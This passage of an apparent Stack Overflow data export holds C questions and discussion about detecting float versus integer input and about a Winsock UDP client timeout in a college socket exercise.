i&lt;MAX; i++)   // sum array (User input, MAX=3)\nsum=sum+arv[];\nprintf(\"\\n sum = %d\", sum);\n\nreturn (0);\n}   \n</code></pre>\n\n<p>But this line   gives me unexpected expression error?!</p>\n\n<pre><code>    sum=sum+arv[];\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 0, "creation_date": 1447263341, "post_id": 33656405, "comment_id": 55086048, "body": "this will not work for numbers below 1.0"}, {"owner": {"reputation": 12289, "user_id": 675568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfe53579fb7b2afd58949be94cf97e?s=128&d=identicon&r=PG", "display_name": "Tom Zych", "link": "https://stackoverflow.com/users/675568/tom-zych"}, "edited": false, "score": 2, "creation_date": 1447263388, "post_id": 33656405, "comment_id": 55086081, "body": "It would be much more reliable to simply search the string for a decimal point. This method is prone to all kinds of errors."}, {"owner": {"reputation": 7646, "user_id": 809384, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/2e88f031bbd7f1ece1c87da1352addd5?s=128&d=identicon&r=PG", "display_name": "Andr&#233; Puel", "link": "https://stackoverflow.com/users/809384/andr%c3%a9-puel"}, "edited": false, "score": 0, "creation_date": 1447263684, "post_id": 33656405, "comment_id": 55086253, "body": "if (ceil(num1) == num1) then integer"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 7646, "user_id": 809384, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/2e88f031bbd7f1ece1c87da1352addd5?s=128&d=identicon&r=PG", "display_name": "Andr&#233; Puel", "link": "https://stackoverflow.com/users/809384/andr%c3%a9-puel"}, "edited": false, "score": 0, "creation_date": 1447263761, "post_id": 33656405, "comment_id": 55086299, "body": "@Andr&#233;Puel It is not guaranteed to work in all cases. Actually it is likely not to work at all as it is float equality operator which is bad always."}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 0, "creation_date": 1447264648, "post_id": 33656405, "comment_id": 55086829, "body": "<code>int num2 = num1; if (((num2 * 100) % 100) == 0)</code>... How can this condition ever be false?? I have to put my glasses."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447265048, "post_id": 33656405, "comment_id": 55087065, "body": "<code>float num1; ... scanf(&quot;%lf&quot;, &amp;num1);</code> is bad.  Mis-matched type and format specifier."}, {"owner": {"reputation": 7646, "user_id": 809384, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/2e88f031bbd7f1ece1c87da1352addd5?s=128&d=identicon&r=PG", "display_name": "Andr&#233; Puel", "link": "https://stackoverflow.com/users/809384/andr%c3%a9-puel"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447292225, "post_id": 33656405, "comment_id": 55099477, "body": "@EugeneSh. My motivation is that for user input numbers it will be fine. Of course, if the number is the result of an expression then it will probably fail. Like ceil(2.28*100) == 2.28*100"}], "answers": [{"comments": [{"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1447264260, "post_id": 33656648, "comment_id": 55086582, "body": "Where does the OP use the modulo operator on a <code>float</code>?"}, {"owner": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447264637, "post_id": 33656648, "comment_id": 55086823, "body": "@pallavi thank you for the answer. It is still the same."}, {"owner": {"reputation": 556, "user_id": 4110394, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k2KWD.jpg?s=128&g=1", "display_name": "Ambika", "link": "https://stackoverflow.com/users/4110394/ambika"}, "reply_to_user": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447264800, "post_id": 33656648, "comment_id": 55086911, "body": "@Mrs.Husain, It still gives 1.24 as integer"}, {"owner": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447265116, "post_id": 33656648, "comment_id": 55087103, "body": "@pallavi yes it still gives it as an integer!"}, {"owner": {"reputation": 556, "user_id": 4110394, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k2KWD.jpg?s=128&g=1", "display_name": "Ambika", "link": "https://stackoverflow.com/users/4110394/ambika"}, "reply_to_user": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447265198, "post_id": 33656648, "comment_id": 55087158, "body": "@Mrs.Husain, giving float on my machine"}, {"owner": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447266444, "post_id": 33656648, "comment_id": 55087928, "body": "@pallavi 1.24 is given float, but a number like 2,2222 is given integer. Still thank you for your help and time. =)"}, {"owner": {"reputation": 556, "user_id": 4110394, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k2KWD.jpg?s=128&g=1", "display_name": "Ambika", "link": "https://stackoverflow.com/users/4110394/ambika"}, "reply_to_user": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447266738, "post_id": 33656648, "comment_id": 55088134, "body": "@Mrs.Husain, but 2,2222 is an integer, then it must give it as integer."}, {"owner": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447267050, "post_id": 33656648, "comment_id": 55088346, "body": "@pallavi how is 2.222 an integer? Forgive me if I am wrong, but isn&#39;t any number that has a fractional part a float?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447268328, "post_id": 33656648, "comment_id": 55089138, "body": "Be clear about <code>.</code> and <code>,</code> as decimal point and thousand&#39;s separator.  Different place have different conventions."}, {"owner": {"reputation": 556, "user_id": 4110394, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k2KWD.jpg?s=128&g=1", "display_name": "Ambika", "link": "https://stackoverflow.com/users/4110394/ambika"}, "reply_to_user": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "edited": false, "score": 0, "creation_date": 1447306783, "post_id": 33656648, "comment_id": 55103429, "body": "@Mrs.Husain, what is &#39; %lf &#39; in                       scanf(&quot;%lf&quot;, &amp;num1);"}], "tags": [], "owner": {"reputation": 556, "user_id": 4110394, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k2KWD.jpg?s=128&g=1", "display_name": "Ambika", "link": "https://stackoverflow.com/users/4110394/ambika"}, "is_accepted": false, "score": 0, "last_activity_date": 1447306714, "last_edit_date": 1447306714, "creation_date": 1447264105, "answer_id": 33656648, "question_id": 33656405, "link": "https://stackoverflow.com/questions/33656405/check-if-user-input-is-float-or-integer/33656648#33656648", "title": "Check if user input is float or integer", "body": "<p>Since, you are assigning num1 to num2, and num2 is declared as integer.</p>\n\n<pre><code>Means if you do like:\nnum1=34.5;\nthen after num2=num1;\nnum2=34; not 34.5\n</code></pre>\n\n<p>Hence,your number become integer here.</p>\n\n<p>And % doesn't work for float as we know.</p>\n\n<p>If you want to check your input as float or integer, then you can ceil function </p>\n\n<pre><code>if(ceil(num1)==num1)\n</code></pre>\n\n<p>This'll surely work.</p>\n\n<p>I'm pasting here sample for that :</p>\n\n<pre><code>    float num1;\n    printf(\"Enter number: \");\n    scanf(\"%f\", &amp;num1);\n\n    if (ceil(num1)==num1) {\n\n            printf(\"integer \\n\");\n    }\n    else {\n            printf(\"float \\n\");\n    }\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 5551643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d45b7dcb2f28b56e523726b460d72f5e?s=128&d=identicon&r=PG&f=1", "display_name": "Mrs.Husain", "link": "https://stackoverflow.com/users/5551643/mrs-husain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 814, "favorite_count": 0, "closed_date": 1447264403, "answer_count": 1, "score": -1, "last_activity_date": 1447306714, "creation_date": 1447263256, "last_edit_date": 1447263409, "question_id": 33656405, "link": "https://stackoverflow.com/questions/33656405/check-if-user-input-is-float-or-integer", "closed_reason": "Duplicate", "title": "Check if user input is float or integer", "body": "<p>I have created the following program to see if input from user is a float or an integer. The problem is sometimes it says the input is float and sometimes ts says it is integer. Even a number like <code>1.24</code> is integer.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(void) {\n\n        float num1;\n\n        printf(\"Enter number: \");\n        scanf(\"%lf\", &amp;num1);\n\n        int num2 = num1;\n\n        if (((num2 * 100) % 100) == 0) {\n\n                printf(\"float \\n\");\n        }\n        else {\n                printf(\"integer \\n\");\n        }\n}\n</code></pre>\n"}, {"tags": ["c", "windows", "sockets", "udp", "timeout"], "comments": [{"owner": {"reputation": 8677, "user_id": 2378910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51c5516f058929cbdca03b0319e61bf8?s=128&d=identicon&r=PG", "display_name": "Kenney", "link": "https://stackoverflow.com/users/2378910/kenney"}, "edited": false, "score": 0, "creation_date": 1447263429, "post_id": 33656344, "comment_id": 55086102, "body": "Try some higher timeouts: ping times between client and server can easily reach 4ms or higher already, so 5ms is cutting it very close."}, {"owner": {"reputation": 47, "user_id": 3761945, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oNEeM.jpg?s=128&g=1", "display_name": "jagnelo", "link": "https://stackoverflow.com/users/3761945/jagnelo"}, "reply_to_user": {"reputation": 8677, "user_id": 2378910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51c5516f058929cbdca03b0319e61bf8?s=128&d=identicon&r=PG", "display_name": "Kenney", "link": "https://stackoverflow.com/users/2378910/kenney"}, "edited": false, "score": 0, "creation_date": 1447269833, "post_id": 33656344, "comment_id": 55089980, "body": "Thank you for the answer, but i forgot to explain this is done within the same pc (ip -&gt; 127.0.0.1) It&#39;s just a bit of testing between some exercises for a college class. Edit : When i ping 127.0.0.1 it gives me 1ms of time"}], "owner": {"reputation": 47, "user_id": 3761945, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oNEeM.jpg?s=128&g=1", "display_name": "jagnelo", "link": "https://stackoverflow.com/users/3761945/jagnelo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 187, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1447263103, "creation_date": 1447263103, "question_id": 33656344, "link": "https://stackoverflow.com/questions/33656344/windows-socket-udp-client-timeout-issue", "title": "Windows Socket (UDP) - Client TIMEOUT issue", "body": "<p>I've a server and a client (code posted bellow).<br/>\nIm testing the <strong>setsockopt</strong> function with the <strong>SO_RCVTIMEO</strong> timeout option in the client program, and it seems to be compiling fine.<br/>\nThe procedure is: server binds to socket for reading - client sends a message to it - server shows message and resends it to whichever client sent it - and finally, client shows message recieved from server <br/>\nSo, to check if the timeout actually fails after X amount of miliseconds (timeout is only used when the client is waiting for the message to be sent back from the server), i inserted a Sleep(miliseconds) function in the server just before it resends the message to the client, so as to balance this delay between the client and the server. <br/>\nSo, when testing with Sleep(0) and timeout at 0 aswell, everything works perfectly synchronized, but if i lift the values to, say, 10 ms on both ends, the result should be the same as with 0, but actually, everything works as planned except when the client awaits for the server's response, it timeout's, eventhough the delay on both ends is exactly the same. <br/>\nAs a last example: if the Sleep on the server is 10ms, and the timeout on the client is 11, or even 15 to leave some more room, what happens is, server recieves message, waits 10ms, resends it, the client that was suposed to wait another 5ms to complete the 15ms, actually timeout's. Even worse, the server after completeting it's whole process resumes it's initial awaiting-response loop, somehow gives me an error on the recvfrom. <br/>\nExcuse the huge text but it'd be really hard to summarize all of this without leaving some crutial details out.\n<br/><br/>Client.c (ignore the broadcast, it's not being used)</p>\n\n<pre><code>#include &lt;winsock.h&gt;\n#include &lt;stdio.h&gt;\n\n#define SERV_HOST_ADDR \"127.0.0.1\"\n#define SERV_UDP_PORT  6000\n\n#define PORT_MAX 7000\n#define PORT_MIN 1000\n\n#define NUM_IT  10\n\n#define BUFFERSIZE     4096\n\nvoid Abort(char *msg);\n\n/*________________________________ main _______________________________________\n*/\n\nint main(int argc, char *argv[])\n{\n\n    SOCKET sockfd;\n    int msg_len, iResult, nbytes, addrlength, local_port;\n    struct sockaddr_in serv_addr, local;\n    char buffer[BUFFERSIZE];\n    WSADATA wsaData;\n    //broadcast\n    int broadcast, broadcast_loop;\n    //timeout\n    DWORD timeout;// = TIMEOUT;\n\n    /*========================= TESTA A SINTAXE =========================*/\n\n    if (argc != 9){\n        fprintf(stderr, \"(%d argumentos) Sintaxe: %s -msg \\\"msg\\\" -ip ip -port port -timeout microsegundos\\n (ordem arbitraria)\\n\", argc, argv[0]);\n        exit(EXIT_FAILURE);\n    }\n\n    //tratar os argumentos//\n    int pos_msg, pos_port, pos_ip, pos_timeout, i;\n    for (i = 0; i &lt; argc; i++)\n    {\n        if (strcmp(argv[i], \"-msg\") == 0)\n            pos_msg = i + 1;\n        if (strcmp(argv[i], \"-ip\") == 0)\n            pos_ip = i + 1;\n        if (strcmp(argv[i], \"-port\") == 0)\n            pos_port = i + 1;\n        if (strcmp(argv[i], \"-timeout\") == 0)\n            pos_timeout = i + 1;\n    }\n\n    timeout = atol((char*)(LPCTSTR)argv[pos_timeout]); //converter timeout STRING para DWORD\n\n    if (strcmp(argv[pos_ip], \"255.255.255.255\") == 0)\n    {\n        broadcast_loop = 1;\n        broadcast = 1;\n    }\n    else\n    {\n        broadcast_loop = 0;\n        broadcast = 0;\n    }\n\n    /*=============== INICIA OS WINSOCKS ==============*/\n\n    iResult = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);\n    if (iResult != 0) {\n        printf(\"WSAStartup failed: %d\\n\", iResult);\n        getchar();\n        exit(1);\n    }\n\n    /*=============== CRIA SOCKET PARA ENVIO/RECEPCAO DE DATAGRAMAS ==============*/\n\n    sockfd = socket(PF_INET, SOCK_DGRAM, 0);\n    if (sockfd == INVALID_SOCKET)\n        Abort(\"Impossibilidade de criar socket\");\n\n    /*================ CONFIGURA O SOCKET PARA TIMEOUT DE RECEPCAO ==============*/\n\n    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &amp;timeout, sizeof(timeout));\n\n    //this call is what allows broadcast packets to be sent:\n    if (broadcast_loop == 1)\n    {\n        if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (char *)&amp;broadcast, sizeof broadcast) == -1)\n        {\n            perror(\"setsockopt (SO_BROADCAST)\");\n            exit(1);\n        }\n    }\n\n\n    /*================= PREENCHE ENDERECO DO SERVIDOR ====================*/\n\n    memset((char*)&amp;serv_addr, 0, sizeof(serv_addr)); /*Coloca a zero todos os bytes*/\n    serv_addr.sin_family = AF_INET; /*Address Family: Internet*/\n    //serv_addr.sin_addr.s_addr = inet_addr(SERV_HOST_ADDR); /*IP no formato \"dotted decimal\" =&gt; 32 bits*/\n    serv_addr.sin_addr.s_addr = inet_addr(argv[pos_ip]);\n    //serv_addr.sin_port = htons(SERV_UDP_PORT); /*Host TO Netowork Short*/\n    serv_addr.sin_port = htons(atoi(argv[pos_port]));\n\n    /*====================== ENVIA MENSAGEM AO SERVIDOR ==================*/\n\n    msg_len = strlen(argv[pos_msg]);\n\n    if (broadcast_loop == 1)\n    {\n        //loop sem esperar pelo reenvio\n        for (int i = 0; i &lt; NUM_IT; i++)\n        {\n            for (int pt = PORT_MIN; pt &lt;= PORT_MAX; pt++)\n            {\n                serv_addr.sin_port = htons(pt);\n                if (sendto(sockfd, argv[pos_msg], msg_len, 0, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr)) == SOCKET_ERROR)\n                    Abort(\"SO nao conseguiu aceitar o datagram\");\n                printf(\" -Enviada mensagem %d (port: %d)\\n\", i, pt);\n\n                //ir buscar a porta gerada automaticamente pare este socket e mostr\u00e1-la\n                addrlength = sizeof(local);\n                if (getsockname(sockfd, (struct sockaddr *)&amp;local, &amp;addrlength) == 0 &amp;&amp; local.sin_family == AF_INET &amp;&amp; addrlength == sizeof(local))\n                {\n                    local_port = ntohs(local.sin_port);\n                }\n\n                printf(\"&lt;CLI1&gt;Mensagem enviada (port: %d) ... aguardando pelo seu reenvio.\\n\", local_port);\n            }\n\n            //////// ESPERAR QUE MESMA MENSAGEM SEJA REENVIADA PELO SERVIDOR //////\n            ////nbytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);\n            ////memset((char*)&amp;serv_addr, 0, sizeof(serv_addr));\n            //addrlength = sizeof(serv_addr);\n            //nbytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&amp;serv_addr, &amp;addrlength);\n\n            //if (nbytes == SOCKET_ERROR)\n            //  Abort(\"Erro na recepcao da mensagem\");\n\n            //buffer[nbytes] = '\\0'; /*Termina a cadeia de caracteres recebidos com '\\0'*/\n\n            //printf(\"\\n&lt;CLI1&gt;Mensagem recebida {%s}\\n\", buffer);\n\n            //if (strcmp(inet_ntoa(serv_addr.sin_addr), SERV_HOST_ADDR) == 0 &amp;&amp; ntohs(serv_addr.sin_port) == SERV_UDP_PORT)\n            //  printf(\" -Mensagem enviada pelo servidor -&gt; %s:%d\\n\", inet_ntoa(serv_addr.sin_addr), ntohs(serv_addr.sin_port));\n            //else\n            //  printf(\" -Mensagem NAO enviada pelo servidor -&gt; %s:%d\\n\", inet_ntoa(serv_addr.sin_addr), ntohs(serv_addr.sin_port));\n\n        }\n    }\n    else\n    {\n        if (sendto(sockfd, argv[pos_msg], msg_len, 0, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr)) == SOCKET_ERROR)\n            Abort(\"SO nao conseguiu aceitar o datagram\");\n\n        //ir buscar a porta gerada automaticamente pare este socket e mostr\u00e1-la\n        addrlength = sizeof(local);\n        if (getsockname(sockfd, (struct sockaddr *)&amp;local, &amp;addrlength) == 0 &amp;&amp; local.sin_family == AF_INET &amp;&amp; addrlength == sizeof(local))\n        {\n            local_port = ntohs(local.sin_port);\n        }\n\n        printf(\"&lt;CLI1&gt;Mensagem enviada (port: %d) ... aguardando pelo seu reenvio (timeout).\\n\", local_port);\n\n        ////// ESPERAR QUE MESMA MENSAGEM SEJA REENVIADA PELO SERVIDOR //////\n        //nbytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);\n        //memset((char*)&amp;serv_addr, 0, sizeof(serv_addr));\n        addrlength = sizeof(serv_addr);\n        nbytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&amp;serv_addr, &amp;addrlength);\n\n        if (nbytes == SOCKET_ERROR)\n        if (WSAGetLastError() != WSAETIMEDOUT)\n            Abort(\"Erro na recepcao da mensagem\");\n        else\n            Abort(\"Timeout de recepcao\");\n\n\n        buffer[nbytes] = '\\0'; /*Termina a cadeia de caracteres recebidos com '\\0'*/\n\n        printf(\"\\n&lt;CLI1&gt;Mensagem recebida {%s}\\n\", buffer);\n\n        if (strcmp(inet_ntoa(serv_addr.sin_addr), SERV_HOST_ADDR) == 0 &amp;&amp; ntohs(serv_addr.sin_port) == SERV_UDP_PORT)\n            printf(\" -Mensagem enviada pelo servidor -&gt; %s:%d\\n\", inet_ntoa(serv_addr.sin_addr), ntohs(serv_addr.sin_port));\n        else\n            printf(\" -Mensagem NAO enviada pelo servidor -&gt; %s:%d\\n\", inet_ntoa(serv_addr.sin_addr), ntohs(serv_addr.sin_port));\n\n    }\n\n    /*========================= FECHA O SOCKET ===========================*/\n\n    closesocket(sockfd);\n\n    printf(\"\\n\");\n    system(\"Pause\");\n    exit(EXIT_SUCCESS);\n}\n\n/*________________________________ Abort________________________________________\nMostra uma mensagem de erro e o c\u00f3digo associado ao ultimo erro com Winsocks.\nTermina a aplicacao com \"exit status\" a 1 (constante EXIT_FAILURE)\n________________________________________________________________________________*/\n\nvoid Abort(char *msg)\n{\n\n    fprintf(stderr, \"&lt;CLI1&gt;Erro fatal: &lt;%s&gt; (%d)\\n\", msg, WSAGetLastError());\n    exit(EXIT_FAILURE);\n\n}\n</code></pre>\n\n<p><br/>\nand Server.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;winsock.h&gt;\n#include &lt;Windows.h&gt; //Sleep()\n\n#define SERV_UDP_PORT 6000\n#define BUFFERSIZE     4096\n\nvoid Abort(char *msg);\n\n/*________________________________ main ________________________________________\n*/\n\nint main(int argc, char *argv[])\n{\n    SOCKET sockfd;\n    int iResult, nbytes, msg_len, len;\n    struct sockaddr_in serv_addr, cli_addr;\n    char buffer[BUFFERSIZE];\n    WSADATA wsaData;\n\n    /*========================= TESTA A SINTAXE =========================*/\n\n    if (argc != 5){\n        fprintf(stderr, \"(%d argumentos) Sintaxe: %s -port port -delay delay\\n\", argc, argv[0]);\n        exit(EXIT_FAILURE);\n    }\n\n    //tratar os argumentos//\n    int pos_port, pos_delay, i;\n    for (i = 0; i &lt; argc; i++)\n    {\n        if (strcmp(argv[i], \"-port\") == 0)\n            pos_port = i + 1;\n        if (strcmp(argv[i], \"-delay\") == 0)\n            pos_delay = i + 1;\n    }\n\n    /*=============== INICIA OS WINSOCKS ==============*/\n\n    iResult = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);\n    if (iResult != 0) {\n        printf(\"WSAStartup failed: %d\\n\", iResult);\n        getchar();\n        exit(1);\n    }\n\n    /*============ CRIA O SOCKET PARA RECEPCAO/ENVIO DE DATAGRAMAS UDP ============*/\n\n    if ((sockfd = socket(PF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)\n        Abort(\"Impossibilidade de abrir socket\");\n\n    /*=============== ASSOCIA O SOCKET AO  ENDERECO DE ESCUTA ===============*/\n\n    /*Define que pretende receber datagramas vindos de qualquer interface de\n    rede, no porto pretendido*/\n\n    memset((char*)&amp;serv_addr, 0, sizeof(serv_addr));\n    serv_addr.sin_family = AF_INET; /*Address Family: Internet*/\n    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);  /*Host TO Network Long*/\n    serv_addr.sin_port = htons(atoi(argv[pos_port]));  /*Host TO Network Short*/\n\n    /*Associa o socket ao porto pretendido*/\n\n    if (bind(sockfd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)) == SOCKET_ERROR)\n        Abort(\"Impossibilidade de registar-se para escuta\");\n\n\n    /*================ PASSA A ATENDER CLIENTES INTERACTIVAMENTE =============*/\n\n    while (1){\n\n        fprintf(stderr, \"&lt;SER1&gt;Esperando datagram...\\n\");\n\n        len = sizeof(cli_addr);\n        //recieve from, tem agora de saber de quem recebeu, para reenviar\n        nbytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&amp;cli_addr, &amp;len);\n\n        if (nbytes == SOCKET_ERROR)\n            Abort(\"Erro na recepcao de datagrams\");\n\n        buffer[nbytes] = '\\0'; /*Termina a cadeia de caracteres recebidos com '\\0'*/\n        printf(\"&lt;SER1&gt;Mensagem recebida {%s} de %s:%d\\n\", buffer, inet_ntoa(cli_addr.sin_addr), ntohs(cli_addr.sin_port));\n\n        ////// REENVIAR A MENSAGEM AO CLIENTE //////\n\n        msg_len = strlen(buffer);\n        Sleep(atoi(argv[pos_delay])); //sleep de 'delay' milisegundos\n        if (sendto(sockfd, buffer, msg_len, 0, (struct sockaddr*)&amp;cli_addr, sizeof(cli_addr)) == SOCKET_ERROR)\n            Abort(\"SO nao conseguiu aceitar o datagram\");\n\n        printf(\"&lt;SER1&gt;Mensagem reenviada.\\n\\n\");\n\n    }\n    system(\"Pause\");\n}\n\n/*________________________________ Abort________________________________________\nMostra uma mensagem de erro e o c\u00f3digo associado ao ultimo erro com Winsocks.\nTermina a aplicacao com \"exit status\" a 1 (constante EXIT_FAILURE)\n________________________________________________________________________________*/\n\nvoid Abort(char *msg)\n{\n\n    fprintf(stderr, \"&lt;SER1&gt;Erro fatal: &lt;%s&gt; (%d)\\n\", msg, WSAGetLastError());\n    printf(\"\\n\");\n    system(\"Pause\");\n    exit(EXIT_FAILURE);\n\n}\n</code></pre>\n\n<p><br/>\nIf anyone could make sense out of all this post and provide some helpful answers, i'd greatly appreciate it.</p>\n"}, {"tags": ["c", "arrays", "windows", "icc"], "comments": [{"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1447263067, "post_id": 33656276, "comment_id": 55085880, "body": "How is <code>count</code> initialized when <code>*dest</code> and <code>*nameDest</code> are assigned to?"}, {"owner": {"reputation": 566, "user_id": 2812438, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/a5249ad0b843a058edddce70e58c61fb?s=128&d=identicon&r=PG", "display_name": "EyeOfTheHawks", "link": "https://stackoverflow.com/users/2812438/eyeofthehawks"}, "reply_to_user": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1447263141, "post_id": 33656276, "comment_id": 55085929, "body": "@cad It is set by a snippet that counts the number of files, the value is correct, and there are 5 files"}, {"owner": {"reputation": 11973, "user_id": 1419315, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/e13603f86a9561d16a944963943fb8a9?s=128&d=identicon&r=PG", "display_name": "JohnB", "link": "https://stackoverflow.com/users/1419315/johnb"}, "edited": false, "score": 0, "creation_date": 1447263174, "post_id": 33656276, "comment_id": 55085954, "body": "What is the value of <code>count</code> when it crashes?"}, {"owner": {"reputation": 566, "user_id": 2812438, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/a5249ad0b843a058edddce70e58c61fb?s=128&d=identicon&r=PG", "display_name": "EyeOfTheHawks", "link": "https://stackoverflow.com/users/2812438/eyeofthehawks"}, "reply_to_user": {"reputation": 11973, "user_id": 1419315, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/e13603f86a9561d16a944963943fb8a9?s=128&d=identicon&r=PG", "display_name": "JohnB", "link": "https://stackoverflow.com/users/1419315/johnb"}, "edited": false, "score": 0, 